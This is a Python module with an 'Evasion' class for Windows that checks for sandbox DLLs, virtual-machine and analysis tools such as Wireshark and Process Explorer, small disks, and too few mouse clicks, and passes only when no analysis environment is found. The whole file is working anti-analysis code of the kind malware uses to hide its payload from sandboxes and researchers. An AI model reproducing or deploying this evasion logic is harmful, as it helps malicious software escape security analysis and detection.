from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import win32process
import win32pdh
import sys
import os
import psutil
from winreg import *
from datetime import datetime
from ctypes import *
import ctypes


class Evasion:
    def __init__(self):
        return None
        
    def check_all_DLL_names(self):
        SandboxEvidence = []
        sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        allPids = win32process.EnumProcesses()
        for pid in allPids:
            try:
                hProcess = win32api.OpenProcess(0x0410, 0, pid)
                try:
                    curProcessDLLs = win32process.EnumProcessModules(hProcess)
                    for dll in curProcessDLLs:
                        dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                        for sandboxDLL in sandboxDLLs:
                            if sandboxDLL in dllName:
                                if dllName not in SandboxEvidence:
                                    SandboxEvidence.append(dllName)
                finally:
                    win32api.CloseHandle(hProcess)
            except:
                pass

        if SandboxEvidence:
            return False
        else:
            return True
    
    def check_all_processes_names(self):
        EvidenceOfSandbox = []
        sandboxProcesses = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"
        runningProcesses = [p.name() for p in psutil.process_iter()]

        
        for process in runningProcesses:
            for sandboxProcess in sandboxProcesses:
                if sandboxProcess in str(process):
                    if process not in EvidenceOfSandbox:
                        EvidenceOfSandbox.append(process)
                        break
        if not EvidenceOfSandbox:
            return True
        else:
            return False

    def disk_size(self):
        minDiskSizeGB = 50

        if len(sys.argv) > 1:
            minDiskSizeGB = float(sys.argv[1])

        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()

        diskSizeGB = diskSizeBytes/1073741824

        if diskSizeGB > minDiskSizeGB:
            return True
        else:
            return False

    def click_tracker(self):
        count = 0
        minClicks = 10

        if len(sys.argv) == 2:
            minClicks = int(sys.argv[1])
        while count < minClicks:
            new_state_left_click = win32api.GetAsyncKeyState(1)
            new_state_right_click = win32api.GetAsyncKeyState(2)

            if new_state_left_click % 2 == 1:
                count += 1
            if new_state_right_click % 2 == 1:
                count += 1

        return True
            
    def main(self):
        if self.disk_size() and self.click_tracker() and self.check_all_processes_names() and self.check_all_DLL_names():
            return True
        else:
            return False


def test():
    evasion = Evasion()
    if evasion.main() == True:
        return True
    else:
        return False
